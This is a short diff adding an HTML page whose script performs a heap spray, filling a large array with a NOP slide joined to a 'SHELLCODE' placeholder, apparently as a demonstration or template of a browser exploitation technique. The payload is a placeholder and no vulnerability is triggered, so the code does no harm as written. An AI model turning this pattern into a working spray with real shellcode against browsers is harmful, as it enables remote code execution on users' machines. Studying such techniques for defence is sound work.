@@ -1,0 +1,17 @@
+<html>
+<script>
+
+	var shellcode = "SHELLCODE";
+	var NOPslide = "NOP";
+	while(NOPslide.length < 10) {
+		NOPslide += NOPslide;
+	}
+	var spray = new Array();
+	for (var i = 0; i < 100000; i++){ 
+		spray[i] =  NOPslide + shellcode; 
+	}
+	
+	alert("Spray Done");
+
+</script>
+</html>
